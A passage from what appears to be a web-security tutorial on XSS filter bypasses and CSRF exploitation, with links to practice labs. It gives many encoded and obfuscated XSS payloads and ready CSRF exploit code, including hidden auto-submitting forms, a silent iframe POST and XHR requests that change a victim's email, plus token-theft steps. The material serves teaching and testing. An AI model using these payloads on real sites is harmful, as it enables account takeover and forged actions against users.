<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"\u0061lert(1)"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"eval('\141lert(1)')"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- Octal Escape --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"eval('\x61lert(1)')"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- Hexadecimal Escape --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"&amp;#x0061;lert(1)"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- Hexa Numeric Character Escape --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"&amp;#97;lert(1)"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- Decimal NCR --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"eval('\a\l\ert\(1\)')"</span>/&gt;</span> <span class="hljs-comment">&lt;!-- Superfluous Escapes --&gt;</span>
</code></pre>
<p>All character escaping can stay together!</p>
<pre><code class="lang-html">&lt;img src=x onerror="<span class="hljs-symbol">\u</span>0065val('<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\u</span>006cert<span class="hljs-symbol">\(</span>1)')"/&gt;
</code></pre>
<h4 id="-constructing-strings-"><strong>Constructing Strings</strong></h4>
<p>Knowing how to construct strings is an important skill in bypassing filters. For example, as usual, the <code>alert</code> keyword is blocked, but most likely <code>&quot;ale&quot;+&quot;rt&quot;</code> is not detected. Let’s see some examples.</p>
<p>JavaScript has several functions useful to create strings.</p>
<pre><code class="lang-js">/ale/.source+/rt/.source
String.fromCharCode(<span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">116</span>)
atob(<span class="hljs-string">"YWxlcnQ="</span>)
<span class="hljs-number">17795081.</span>.toString(<span class="hljs-number">36</span>)
</code></pre>
<h4 id="-execution-sinks-"><strong>Execution Sinks</strong></h4>
<p>To execute code, we have used the <code>eval</code> function before, as well as the events associated to some tags. Technically, functions that parse string as <strong>JavaScript code</strong> are called execution sinks, and JavaScript offers several alternatives.</p>
<p>The reason why we must analyze these function is simple: if we are able to control one of them, we can execute JavaScript code!</p>
<p>The following are just a few sinks; for a complete list, refer to the <a href="https://code.google.com/p/domxsswiki/wiki/ExecutionSinks">DOM XSS Wiki</a>:</p>
<pre><code><span class="hljs-function"><span class="hljs-title">setTimeout</span><span class="hljs-params">(<span class="hljs-string">"JSCode"</span>)</span></span> <span class="hljs-comment">//all browsers</span>
<span class="hljs-function"><span class="hljs-title">setInterval</span><span class="hljs-params">(<span class="hljs-string">"JSCode"</span>)</span></span> <span class="hljs-comment">//all browsers</span>
<span class="hljs-function"><span class="hljs-title">setImmediate</span><span class="hljs-params">(<span class="hljs-string">"JSCode"</span>)</span></span> <span class="hljs-comment">//IE 10+</span>
<span class="hljs-function"><span class="hljs-title">Function</span><span class="hljs-params">(<span class="hljs-string">"JSCode"</span>)</span></span> <span class="hljs-comment">//all browsers</span>
</code></pre><p>An interesting variation of the Function sink is:</p>
<pre><code class="lang-js">[].<span class="hljs-keyword">constructor</span>.<span class="hljs-function"><span class="hljs-keyword">constructor</span><span class="hljs-params">(alert(1)</span>)
<span class="hljs-comment">// object.Array.Function.XSS_Vector</span></span>
</code></pre>
<h4 id="-pseudo-protocols-"><strong>Pseudo-protocols</strong></h4>
<p><code>javascript:</code> is an &quot;<a href="http://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-03">unofficial URI scheme</a>&quot;, commonly referred as a pseudo-protocol. It is useful to invoke JavaScript code within a link.</p>
<p>A common pattern recognized by most filters is <code>javascript</code> keyword followed by a colon character (:)</p>
<pre><code class="lang-html">&lt;<span class="hljs-selector-tag">a</span> href=<span class="hljs-string">"javascript:alert(1)"</span>/&gt;
</code></pre>
<blockquote>
<p>[!Note]
<code>javascript:</code> is not needed on event handlers; so, we should avoid using it. Since the pseudo-protocol is often introduced within a string, we can use all the variations seen before.</p>
</blockquote>
<p>Let’s check out some examples.</p>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- Blocked --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"javascrip:alert(1)"</span>&gt;</span>
</code></pre>
<pre><code class="lang-html">&lt;object data=<span class="hljs-string">"JaVaScRiPt:alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"javascript&amp;colon;alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"java
 script:alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"javascript&amp;<span class="hljs-subst">#x003A</span>;alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"javascript&amp;#58;alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"&amp;<span class="hljs-subst">#x6A</span>;avascript:alert(1)"</span>&gt;
&lt;object data=<span class="hljs-string">"&amp;<span class="hljs-subst">#x6A</span>;&amp;<span class="hljs-subst">#x61</span>;&amp;<span class="hljs-subst">#x76</span>;&amp;<span class="hljs-subst">#x61</span>;&amp;<span class="hljs-subst">#x73</span>;&amp;<span class="hljs-subst">#x63</span>;&amp;<span class="hljs-subst">#x72</span>;&amp;<span class="hljs-subst">#x69</span>;&amp;<span class="hljs-subst">#x70</span>;&amp;<span class="hljs-subst">#x74</span>;&amp;<span class="hljs-subst">#x3A</span>;alert(1)"</span>&gt;
</code></pre>
<p>In addition to <code>javascript:</code>, there are also <code>data:</code> (<a href="http://tools.ietf.org/html/rfc2397">RFC 2397</a>), Let&#39;s see how it works.</p>
<h5 id="-data-pseudo-protocol-"><strong>Data Pseudo-Protocol</strong></h5>
<p>The data URI scheme allows for the inclusion of small data items served with different media types. This is the structure form: <code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p>
<p>The media type that mainly interests us is <code>text/html</code>, and the <strong>base64</strong> indicator, which allows us to encode our data. Let’s see some implementations.</p>
<pre><code class="lang-html">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>="javascript:alert(1)"&gt;</span>
</code></pre>
<p>If <code>javascript:</code> is blocked:</p>
<pre><code class="lang-html">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>="<span class="hljs-keyword">data</span>:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</span>
&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>="<span class="hljs-keyword">data</span>:text/html;base64,<span class="hljs-type">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>=="&gt;</span>
</code></pre>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!-- Blocked --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span>
</code></pre>
<p>If <code>data:</code> is blocked:</p>
<pre><code class="lang-html">&lt;embed <span class="hljs-class"><span class="hljs-keyword">data</span>="<span class="hljs-type">DaTa</span>:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</span>
&lt;embed <span class="hljs-class"><span class="hljs-keyword">data</span>="<span class="hljs-keyword">data</span>&amp;colon;text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</span>
&lt;embed <span class="hljs-class"><span class="hljs-keyword">data</span>="<span class="hljs-keyword">data</span>&amp;#x003A;text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</span>
&lt;embed <span class="hljs-class"><span class="hljs-keyword">data</span>="&amp;#x64l&amp;#x61;ta:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</span>
</code></pre>
<h2 id="-bypassing-sanitization-"><strong>Bypassing Sanitization</strong></h2>
<p>Often, security mechanisms choose to sanitize potential XSS vectors instead of blocking the entire request. These are probably the most common filters we may encounter during our tests.</p>
<p>For example, the most common is to HTML-encode some key characters, such as <code>&lt; (&lt;), &gt; (&gt;)</code>, etc. This is not always enough and depends in which point of the page the untrusted data is injected.</p>
<h3 id="-string-manipulations-"><strong>String Manipulations</strong></h3>
<p>In some situations, a filter may manipulate your vector by removing malicious keywords. For example, removing the <code>&lt;script&gt;</code> tags. A common mistake with this behavior is that the rule removes only the first instance of the matched expression.</p>
<h4 id="-removing-html-tags-"><strong>Removing HTML Tags</strong></h4>
<p>For example, <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> is correctly sanitized to <code>alert(1)</code>, but since the check is not performed recursively: <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code>, and this could be a bypass!</p>
<p>Additionally, if the filter performs recursive checks, you should always inspect whether it is still exploitable. Maybe changing the order of injected strings may work in your favor.</p>
<p>Let&#39;s see an example.</p>
<p>It may be possible that recursive checks are in sequence. They start with the <code>&lt;script&gt;</code> tag, then the next one and so on, without restarting again from the first to check if there are no more malicious strings.</p>
<p>The following vector could be a bypass: <code>&lt;scr&lt;iframe&gt;ipt&gt;alert(1)&lt;/script&gt;</code></p>
<p>Of course, if we already know or are able to guess the sequence, then we could create more complex vectors and maybe use several character encodings, as we have seen in Bypassing Blacklisting Filters section.</p>
<blockquote>
<p>It all depends on the filter that we are facing</p>
<h4 id="-escaping-quotes-"><strong>Escaping Quotes</strong></h4>
</blockquote>
<p>It is both a matter of HTML Tags and often, the injection points are inside quoted strings. Commonly, filters place the backslash character <code>\</code> before quotes to escape that kind of character.</p>
<p>It is also required to escape the backslash to avoid bypasses. For example, let us suppose we can control the value <strong>randomkey</strong> in the following code, but the quotes are escaped:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
    <span class="hljs-keyword">var</span> key = <span class="hljs-string">'randomkey'</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>Instead of <strong>randomkey</strong>, if we inject <code>randomkey\&#39; alert(1); //</code> then we have a bypass. This is because the application will escape the apostrophe transforming our input in <code>randomkey\\&#39; alert(1); //</code>. But this will escape only the backslash, allowing us to terminate the string and inject the <code>alert</code> code.</p>
<p>One of useful Javascript methods is <code>String.fromCharCode()</code>. It allows us to generate strings starting from a sequence of Unicode values.</p>
<p>We could also play with the <code>unescape</code> method to escape a string generated. For example, we could escape a string with .source technique <code>unescape(/%78%u0073%73/.source)</code>. Even if this feature has been deprecated, many browsers still support it.</p>
<p>In addition to this, there are <code>decodeURI</code> and <code>decodeURIComponent</code> methods. In this case, characters needs to be URL-encoded to avoid URI malformed errors.</p>
<pre><code class="lang-js">decodeURI(<span class="hljs-name">/alert</span>(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)/.source)
decodeURIComponent(<span class="hljs-name">/alert</span>(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)/.source)
</code></pre>
<p>These methods could be useful if you can inject into a script or event handler, but you cannot use quotation marks because they are properly escaped. Of course, do not forget that each of them will return a string, so you need an execution sink to trigger the code (IE: eval).</p>
<h4 id="-escaping-parentheses-"><strong>Escaping Parentheses</strong></h4>
<p>Parentheses are fundamental to invoke a function and pass parameters. If a potential filter removes all parenthesis in our injected vector, how should we act? Gareth Heyes <a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/">found a way</a> pass arguments to a function without parentheses.</p>
<p>The technique abuses the <code>onerror</code> handler that is part of the window object, assigning a function to call once an error has been generated using <code>throw</code> followed by the arguments to the function assigned to the error handler. Crazy huh? Let’s look at an example.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"window.onerror=eval;throw'=alert\x281\x29'"</span>&gt;</span>
</code></pre>
<h2 id="-labs-"><strong>Labs</strong></h2>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#cross-site-scripting">https://portswigger.net/web-security/all-labs#cross-site-scripting</a></li>
<li><a href="https://www.intigriti.com/researchers/hackademy/xss-challenges">https://www.intigriti.com/researchers/hackademy/xss-challenges</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
</ul>
<hr>
<h1 id="-cross-site-request-forgery-"><strong>Cross-Site Request Forgery</strong></h1>
<p>Usually, in web application security, security vulnerabilities are introduced by mistakes developers make during implementing the application. Cross-Site Request Forgery, however, occurs when developers omit the prevention mechanisms.</p>
<p>Cross-Site Request Forgery, often either abbreviated as CSRF or XSRF, is the most known flavor of the Session Riding attack category.</p>
<h2 id="-recap-more-"><strong>Recap &amp; More</strong></h2>
<p>Everyday web applications perform several <strong>cross-site</strong> requests, such as: requiring external hosted images, JavaScript code, stylesheets, etc. There is nothing wrong with this, quite simply because it’s the way the Web works.</p>
<p>The “wrong part” is when these requests are <strong>forged</strong> in order to send money to the attacker by both performing privileged actions and other malicious operations.</p>
<p>CSRF attacks allow one to exploit the trust relationship between a web application and the HTTP requests made by its users. This forces them to perform arbitrary operations on behalf of the attacker.</p>
<p>Even though the web browser&#39;s <strong>SOP</strong> places huge limitations on the attack vectors (done by preventing the attacker from reading the responses to its cross-domain requests), it does not apply to performed requests. Because the attacker only needs to forge requests and not read responses, we could classify <strong>CSRF</strong> as a <strong>one-way attack</strong>.</p>
<p>A web application is vulnerable to CSRF attacks if:</p>
<ol>
<li>When tracking sessions, the application relies both on mechanisms like HTTP Cookies and Basic Authentication, which are automatically injected into the request by the browser.</li>
<li>The attacker is able to determine all the required parameters in order to perform the malicious request (i.e., no unpredictable parameters are required).</li>
</ol>
<p>In order to exploit a CSRF flaw successfully the attacker must do the following:</p>
<ol>
<li>Make sure that the victim has a valid and active session when the malicious request is executed.</li>
<li>Be able to forge a valid request on behalf of the victim.</li>
</ol>
<p>There are mainly two instances in which this may occur. The first and most dangerous is when the application <strong>lacks anti-CSRF defenses</strong>. The second, in contrast to the first, contains <strong>weak anti CSRF defense</strong> mechanisms such as cookie-only based solutions, confirmation screens, using POST, and checking the <code>referer</code> header.</p>
<h2 id="-attack-vectors-"><strong>Attack Vectors</strong></h2>
<p>With CSRF attacks, an attacker can send a request on behalf of the victim using their web browser, which simply means that the attacker can target any website that is accessible from the victim&#39;s browser. This includes both intranet and others that are normally inaccessible to the attacker.</p>
<p>Let’s check out the real power of a CSRF attack and the ways an attacker can embrace to exploit this kind of vulnerability.</p>
<p>There are several techniques that can be used to perform a CSRF attack and they mainly depend on the vulnerable implementation we are testing.</p>
<h3 id="-force-browsing-with-get-"><strong>Force Browsing with GET</strong></h3>
<p>As we already know, an effective CSRF attack is when the attacker is able to force the victim&#39;s browser into making a valid HTTP request on the target application.</p>
<p>The simplest scenario is when the victim application makes use of HTTP GET requests to perform the vulnerable operation.</p>
<p>For instance, let’s consider a simple form in a member&#39;s area which allows users to change their email address. The mechanism is simple, provide the new address and submit the form.</p>
<pre><code class="lang-html">&lt;<span class="hljs-keyword">form</span> action=<span class="hljs-string">"change.php"</span>&gt;
    &lt;<span class="hljs-keyword">label</span> name=<span class="hljs-string">"email"</span>&gt;Your email is: &lt;b&gt;myC00Lemail@victim.site&lt;/b&gt;&lt;/<span class="hljs-keyword">label</span>&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"old"</span> value=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;
    &lt;<span class="hljs-keyword">label</span> name=<span class="hljs-string">"email"</span>&gt;New email&lt;/<span class="hljs-keyword">label</span>&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"email"</span> name=<span class="hljs-string">"new"</span> placeholder=<span class="hljs-string">"New email"</span> required&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"confirm"</span>&gt;
&lt;/<span class="hljs-keyword">form</span>&gt;
</code></pre>
<p>As noted, the form is submitted using the <strong>HTTP GET</strong> method and does not adopt any anti-CSRF protection.</p>
<p>Now, to exploit this vulnerability, we need to generate a <strong>GET</strong> request and then trick the victim (or their browser) into executing it.</p>
<p>The simplest method to generate a GET request is to use images. This is merely because GET is the standard method used when requesting an image with HTML.</p>
<pre><code class="lang-html">&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">'http://victim.site/csrf/changeemail/change.php?old=myC00Lemail%40victim.site&amp;new=evil@hacker.site'</span>&gt;
</code></pre>
<p>To deliver the attack, we must exploit an existing flaw like XSS, and inject either HTML or JavaScript. Otherwise, we need to social engineer the victim in order to have them visit our malicious page or click a link we provide.</p>
<p>The example with the IMG tag is very common; however, it is not the only solution to forging GET requests by using only HTML tags.</p>
<blockquote>
<p>[!Note]
If you want a complete list of tags and attributes that support URIs there is nothing better than the RFCs! (<a href="http://www.w3.org/TR/REC-html40/index/attributes.html">HTML4</a> &amp; <a href="http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1">HTML5</a>)</p>
<h3 id="-post-requests-"><strong>POST Requests</strong></h3>
</blockquote>
<p>Submitting data that needs to be processed server-side utilizing the HTTP GET method is not a good idea. GET requests should only be used to retrieve information while POST is the appropriate method to use when dealing with sensitive data.</p>
<p>Even if the ways of distributing the CSRF attack and deceiving the victim are the same, exploiting a CSRF flaw with a form action, requiring HTTP POST, is slightly different than GET.</p>
<p>Using only HTML, the only way to forge POST requests is with the attribute method of tag FORM.</p>
<pre><code class="lang-html">&lt;form action=<span class="hljs-string">"somewhere.php"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>&gt;
</code></pre>
<p>As a result, we need to create a cloned form and then social engineer the victim into clicking the submit button. However, this is only one of many possible scenarios. We can use HTML + JavaScript and create a much more effective attack that does not require user interaction.</p>
<p>Let’s look at the evolution of the previous change email example, but this time using POST.</p>
<p>Auto-submitting a form requires the <code>submit()</code> method and a bit of JavaScript, as we can see below:</p>
<pre><code class="lang-html">&lt;form action=<span class="hljs-string">"change.php"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span> id=<span class="hljs-string">"CSRForm"</span>&gt;
    &lt;input name=<span class="hljs-string">"old"</span> value=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;
    &lt;input name=<span class="hljs-string">"new"</span> value=<span class="hljs-string">"evil@hacker.site"</span>&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById(<span class="hljs-string">"CSRForm"</span>).submit()&lt;/script&gt;
</code></pre>
<p>The script tag is not our only option in this context. By using event handlers, we can further add HTML elements in the malicious page. For example, <code>onload</code> and <code>onerror</code> are event handlers that do not require user interaction.</p>
<pre><code class="lang-html">&lt;form action=<span class="hljs-string">"change.php"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span> id=<span class="hljs-string">"CSRForm"</span>&gt;
    &lt;input name=<span class="hljs-string">"old"</span> value=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;
    &lt;input name=<span class="hljs-string">"new"</span> value=<span class="hljs-string">"evil@hacker.site"</span>&gt;
    &lt;img src=x onerror=<span class="hljs-string">"CSRForm.submit();"</span>&gt;
&lt;/form&gt;
</code></pre>
<p>Another example uses a new attribute introduced in HTML5, <code>autofocus</code> and the related event handler <code>onfocus</code>.</p>
<pre><code class="lang-html">&lt;form action=<span class="hljs-string">"change.php"</span> method=<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span> id=<span class="hljs-string">"CSRForm"</span>&gt;
    &lt;input name=<span class="hljs-string">"old"</span> value=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;
    &lt;input name=<span class="hljs-string">"new"</span> value=<span class="hljs-string">"evil@hacker.site"</span> autofocus onfocus=<span class="hljs-string">"CSRForm.submit()"</span>&gt;
&lt;/form&gt;
</code></pre>
<p>Using HTML and JavaScript in the way we just witnessed is ineffective. This is because the browser performs the POST request either in a new page or by reloading the same one.</p>
<p>Let’s now see how to perform POST requests <strong>silently</strong>.</p>
<p>Extending on v1 of the example, the following is a solution to prevent the browser from opening a new tab or refreshing the existing one:</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"CSRFrame"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"change.php"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"CSRForm"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"CSRFrame"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"old"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"new"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"evil@hacker.site"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"CSRForm"</span>).submit()</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>Additionally, silent POST requests can be forged using <code>XMLHttpRequest</code> (XHR):</p>
<pre><code class="lang-js">var url = <span class="hljs-string">"URL"</span>;
var params = <span class="hljs-string">"old=mycoolemail@victim.site&amp;new=evil@hacker.site"</span>;
var CSRF = new XMLHttpRequest();
CSRF.open(<span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>, url, false);
CSRF.setRequestHeader(<span class="hljs-string">"Content-type"</span>, <span class="hljs-string">"application/x-www-form-urlencoded"</span>); CSRF.send(params);
</code></pre>
<p>This can also be done using JavaScript libraries such as <strong>jQuery</strong>:</p>
<pre><code class="lang-js">$.ajax({
    type: <span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>, 
    url: <span class="hljs-string">"URL"</span>, 
    data: <span class="hljs-string">"old=mycoolemail@victim.site&amp;new=evil@hacker.site"</span>
});
</code></pre>
<h2 id="-exploiting-weak-anti-csrf-measures-"><strong>Exploiting Weak Anti-CSRF Measures</strong></h2>
<p>As seen in the previous section, exploiting a CSRF flaw can be straightforward if the website lacks anti-CSRF security measures; however, as we are going to see in this chapter, nothing changes if the security defenses are poor or weak.</p>
<p>There are several well-known solutions that do not provide adequate protection. If these measures are in place, then our attack could be a little more difficult; however, surely this will not stop from exploiting the CSRF flaw.</p>
<h3 id="-using-post-only-requests-"><strong>Using POST-only Requests</strong></h3>
<p>The first weak Anti-CSRF measure involves using only POST requests of the trusted mechanism. As we already know, GET requests can be cached, bookmarked, etc. This is the nature of the web and it should not be used for operations that cause a state to change. These may include functionality like database operations, writing files, etc.</p>
<p>As a result, using POST requests for sensitive operations is better practice and protects against a well-known class of CSRF attack vectors. These allow the attacker to construct a malicious link, such as requesting an embedded image, iframe, etc.</p>
<p>Of course, using POST requests instead of GET will raise the bar for CSRF. As we have seen previously, there are several methods by which an attacker can trick a victim into submitting a POST request.</p>
<h3 id="-checking-referer-header-"><strong>Checking Referer Header</strong></h3>
<p>The HTTP Referer header was introduced to allow a server to check where a request was originated and therefore perform logging, optimized caching, etc. Although spoofing the Referer header is quite trivial using browser extension or web proxies, this is clearly not possible in a CSRF attack. It is because of this that many developers adopt this measure as a solution to prevent CSRF attacks.</p>
<p>However, this implementation has some common mistakes. Perhaps the most notable is the referrer not being sent if the website is using SSL/TLS. This doesn&#39;t take into consideration that firewalls, corporate proxies, etc. might remove this header. In this case, developers need to add some business logic in order to understand whether the request is an attack or a legitimate request.</p>
<p>Generally speaking, checking the Referer header is something more attuned to an intrusion detection rather than being a solid anti-CSRF counter measure. It can help in detecting some attacks; however, it will not stop all attacks. An example is an XSS flaw in the same origin!</p>
<h3 id="-predictable-anti-csrf-token-"><strong>Predictable Anti-CSRF Token</strong></h3>
<p>One of the most effective solutions for reducing the likelihood of CSRF exploitation is to use a <strong>Synchronizer Token Pattern</strong>, commonly called Anti-CSRF Tokens. This design pattern requires the generating of a challenge token that will be inserted within the HTML page. Another countermeasure might be <strong><a href="https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7">SameSite cookie</a></strong>.</p>
<p>Once the user wishes to invoke operations that require the token, then it must be included in the request.</p>
<p>In addition to the correct implementation of the token pattern system, it is essential that the token values are <strong>randomly generated</strong>. This is so that they cannot be guessed by an attacker.</p>
<p>Obviously, if a web application uses easily guessable tokens as anti-CSRF measure, it is extremely vulnerable.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"antiCSRF"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"10"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"antiCSRF"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"c9f0f895fb98ab9159f51fd0297e236d"</span>&gt;</span> <span class="hljs-comment">&lt;!-- MD5(8) --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"antiCSRF"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"MjE="</span>&gt;</span> <span class="hljs-comment">&lt;!-- Base64(21) --&gt;</span>
</code></pre>
<h3 id="-unverified-anti-csrf-token-"><strong>Unverified Anti-CSRF Token</strong></h3>
<p>Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side. This may seem unlikely, but it has occurred!</p>
<pre><code class="lang-html">&lt;<span class="hljs-keyword">form</span> action=<span class="hljs-string">"change.php"</span>&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"antiCSRF"</span> value=<span class="hljs-string">"bgoDZVGis4bdsh672388293OrttIvgV"</span>&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"hidden"</span> name=<span class="hljs-string">"old"</span> value=<span class="hljs-string">"myC00Lemail@victim.site"</span>&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"email"</span> name=<span class="hljs-string">"new"</span> placeholder=<span class="hljs-string">"New email"</span> required&gt;
    &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"Confirm"</span>&gt;
&lt;/<span class="hljs-keyword">form</span>&gt;
</code></pre>
<h2 id="-advanced-csrf-exploitation-"><strong>Advanced CSRF Exploitation</strong></h2>
<p>Anti-CSRF token mechanisms, and other CSRF prevention techniques, have been introduced to mitigate security attacks involving Cross-site Request Forgery, however, not stacked attacks that involve Cross-site Scripting (XSS).</p>
<p>A single XSS flaw is like a storm that overwhelms the entire CSRF protection system.</p>
<h3 id="-bypassing-csrf-defenses-with-xss-"><strong>Bypassing CSRF Defenses with XSS</strong></h3>
<p>Technically, once we have exploited an XSS flaw, we are in the same origin of the CSR. All defenses against CSRF, except Challenge-Response mechanisms, are useless. Synchronizer token, Checking the Referer header and Checking the Origin header can all be bypassed.</p>
<h4 id="-bypassing-header-checks-"><strong>Bypassing Header Checks</strong></h4>
<p>Checking Referer and Origin headers simply means that the request must come from a proper origin. Bypassing these types of defense measures are straightforward as long as we have effectively exploited an XSS vulnerability.</p>
<h4 id="-bypassing-anti-csrf-token-"><strong>Bypassing Anti-CSRF Token</strong></h4>
<p>The scenario changes when the security measure is implemented using the Synchronizer Token Pattern. To circumvent this protection, we need to hijack the Anti-CSRF token from a valid form and then use the token stolen in our forged form.</p>
<p>Once the XSS flaw has been detected there are generally two scenarios that play out. The first, and &quot;luckiest&quot; occurs when XSS and CSRF-protected forms are contained on the same page. The second possibility is that the XSS flaw is located in another part of the web application.</p>
<p>Bypassing an Anti-CSRF based mechanism there are generally 2 - 3 steps required, depending on where it is located the XSS.</p>
<ol>
<li>Request a valid form (with a valid token)</li>
<li>Extract the valid token from the source code</li>
<li>Forge the form with the stolen token</li>
</ol>
<p>Obviously, exploiting the XSS does not mean <code>alert(1)</code>, but rather &quot;include my JavaScript evil lib”. This library will contain all the functions useful in performing our steps.</p>
<p>Let’s check out some possible implementations of what we need.</p>
